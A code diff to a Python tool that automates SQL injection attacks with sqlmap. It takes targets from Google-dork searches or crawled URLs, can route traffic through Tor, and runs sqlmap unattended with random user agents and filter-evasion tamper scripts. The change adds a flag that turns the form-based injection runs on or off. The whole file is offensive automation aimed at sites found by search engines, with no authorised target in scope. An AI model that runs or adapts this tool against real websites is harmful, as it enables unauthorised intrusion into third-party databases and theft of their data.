@@ -14,7 +14,7 @@ def static_sqli(url):
 	#re.search("",url)
 	pass
 
-def sqlmap_g_nohuman(http_url_or_file,tor_or_not):
+def sqlmap_g_nohuman(http_url_or_file,tor_or_not,post_or_not):
 	#this function use sqlmap's "-g" option to find sqli urls,but this "-g"
 	#option can only get 100 results due to google api restriction,but in 
 	#this mode,there is no need for us human to handle any situation.
@@ -30,12 +30,14 @@ def sqlmap_g_nohuman(http_url_or_file,tor_or_not):
 			print("sqlmap_string is:%s" % sqlmap_string)
 			print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
 			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
-			os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+			if post_or_not==True:
+				os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
 		elif tor_or_not==True:
 			print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
 			print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
 			os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
-			os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
+			if post_or_not==True:
+				os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
 
 	else:
 		fp=open(http_url_or_file,"r+")
@@ -53,14 +55,17 @@ def sqlmap_g_nohuman(http_url_or_file,tor_or_not):
 				print("sqlmap_string is:%s" % sqlmap_string)
 				print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
 				os.system("/usr/bin/python2.7 %s" % sqlmap_string)
-				os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+				if post_or_not==True:
+					os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+
 			elif tor_or_not==True:
 				print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
 				print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
 				os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
-				os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
+				if post_or_not==True:
+					os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
 
-def sqlmap_craw(origin_http_url_or_file,tor_or_not):
+def sqlmap_craw(origin_http_url_or_file,tor_or_not,post_or_not):
 	#this function use sqlmap's "--crawl" option to find sqli urls.
 	if re.match("(http://)|(https://)",origin_http_url_or_file):
 		origin_http_url=re.sub(r'(\s)',"",origin_http_url_or_file)
@@ -73,17 +78,20 @@ def sqlmap_craw(origin_http_url_or_file,tor_or_not):
 			print("sqlmap_string is:%s" % sqlmap_string)
 			print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
 			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
-			os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+			if post_or_not==True:
+				os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+			
 		elif tor_or_not==True:
 			print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
 			print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
 			os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
-			os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
+			if post_or_not==True:
+				os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
 	else:
 		fp=open(origin_http_url_or_file,"r+")
 		all_urls=fp.readlines()
 		fp.close()
-		for each in all_urls:	
+		for each in all_urls:
 			origin_http_url=re.sub(r'(\s)',"",each)		
 			sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (origin_http_url,origin_http_url)
 			forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (origin_http_url,origin_http_url)
@@ -94,15 +102,17 @@ def sqlmap_craw(origin_http_url_or_file,tor_or_not):
 				print("sqlmap_string is:%s" % sqlmap_string)
 				print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
 				os.system("/usr/bin/python2.7 %s" % sqlmap_string)
-				os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+				if post_or_not==True:
+					os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
 			elif tor_or_not==True:
 				print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
 				print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
 				os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
-				os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
+				if post_or_not==True:
+					os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
 
 
-def sqlmap_g_human(http_url_or_file,tor_or_not):
+def sqlmap_g_human(http_url_or_file,tor_or_not,post_or_not):
 	#this function use myGoogleScraper to search google dork to get the full
 	#urls,in this mode,we need input the yanchengma by human,not robot,coz 
 	#sqlmap's -g option can only get the former 100 results,this function will
@@ -123,12 +133,14 @@ def sqlmap_g_human(http_url_or_file,tor_or_not):
 			print("sqlmap_string is:%s" % sqlmap_string)
 			print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
 			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
-			os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+			if post_or_not==True:
+					os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
 		elif tor_or_not==True:
 			print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
 			print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
 			os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
-			os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
+			if post_or_not==True:
+					os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
 	else:
 		#print(666666661111111)
 		try:
@@ -156,12 +168,14 @@ def sqlmap_g_human(http_url_or_file,tor_or_not):
 				print("sqlmap_string is:%s" % sqlmap_string)
 				print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
 				os.system("/usr/bin/python2.7 %s" % sqlmap_string)
-				os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+				if post_or_not==True:
+					os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
 			elif tor_or_not==True:
 				print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
 				print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
 				os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
-				os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
+				if post_or_not==True:
+					os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
 		except:
 			print("open file error")
 		
